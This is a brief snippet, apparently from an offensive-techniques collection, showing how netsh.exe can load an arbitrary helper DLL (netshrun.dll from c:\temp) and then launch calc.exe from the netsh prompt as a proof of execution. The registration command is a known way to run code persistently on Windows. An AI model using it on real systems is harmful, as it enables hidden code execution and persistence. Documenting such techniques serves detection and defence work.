The `netsh.exe` command allows you to add your own extensions. And what if the extension is malicious...?
```powershell
netsh.exe add helper c:\temp\netshrun.dll
```

start netsh and excute run command

```powershell
c:\> netsh.exe
netsh> run
netsh run> start calc.exe

```
